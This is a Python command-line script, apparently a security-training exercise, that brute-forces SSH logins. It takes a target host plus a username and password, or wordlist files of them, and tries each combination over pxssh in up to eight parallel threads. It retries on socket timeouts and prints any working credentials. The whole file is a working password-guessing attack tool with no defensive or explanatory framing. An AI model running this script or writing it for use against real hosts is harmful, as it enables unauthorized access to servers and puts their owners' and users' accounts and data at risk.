from pexpect import pxssh
import optparse
from threading import *
import time
maxConnections = 8
connection_lock = BoundedSemaphore(value=maxConnections)
screenLock = Semaphore(value=1)
Found = False
Fails = 0

def connect(host,username,password,release):
    global Found
    global Fails
    print("[-] Testing username:" + username + " password : " + password)
    try:
        s = pxssh.pxssh()
        s.login(host,username,password)
        print('[+] Found user :%s Password %s:  '% (username,password))
        Found = True
    except Exception as e:
        if 'Could not establish' in str(e):
            print(e)
            Fails += 1
            time.sleep(3)
            connect(host,username,password,False)
        else:
            print(e)
            pass
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser('Usage %Prog -H <target Host> -u <User> -U <User file> -p <password> -P <Password file>')
    parser.add_option('-H', dest='tgtHost', type='string', help='Specify target host')
    parser.add_option('-u', dest='username', type='string', help='Specify target username')
    parser.add_option('-p', dest='password', type='string', help='Specify target password')
    parser.add_option('-U', dest='userfile', type='string', help='Specify target userfile')
    parser.add_option('-P', dest='passfile', type='string', help='Specify target passfile')
    parser.add_option('-s', dest='maxsession', type='int', help='Specify max session num')
    (options,agrs) = parser.parse_args()
    host = options.tgtHost
    username = options.username
    userfile = options.userfile
    password = options.password
    passwdFile = options.passfile
    global maxConnections
    global connection_lock
    if options.maxsession != None:
        print(options.maxsession)
        maxConnections = options.maxsession
        connection_lock = BoundedSemaphore(value=maxConnections)
    #     # set max connection number

    if (host == None) or (userfile == None and username == None) or (password == None and passwdFile == None) or (userfile != None and username != None) or (password != None and passwdFile != None):
        print(parser.usage)
        exit(0)

    if username != None and password != None:
        connect(host,username,password,False)
        exit(0)


    if passwdFile != None and username != None:
        with open(passwdFile,'r', errors="ignore") as f:
            for passwd in f.readlines():
                if Found:
                    print("[*] Exiting : Password Found")
                    exit(0)
                if Fails > 5:
                    print("[!] Exiting : Too Many Socket Timeouts")
                    exit(0)
                connection_lock.acquire()
                passwd = passwd.strip('\n').strip('\r')
                t = Thread(target=connect,args=(host,username,passwd,True))
                child = t.start()
    elif (userfile != None)and passwdFile != None:
        with open(userfile,'r',errors='ignore') as u:
            for user in u.readlines():
                username = user.strip('\n').strip('\r')
                with open(passwdFile,'r',errors='ignore') as f:
                    for passwd in f.readlines():
                        if Found:
                            print("[*] Exiting : Password Found")
                            exit(0)
                        if Fails > 5:
                            print("[!] Exiting : Too Many Socket Timeouts")
                            exit(0)
                        connection_lock.acquire()
                        passwd = passwd.strip('\n').strip('\r')
                        t = Thread(target=connect, args=(host, username, passwd, True))
                        child = t.start()
if __name__ == '__main__':
    main()

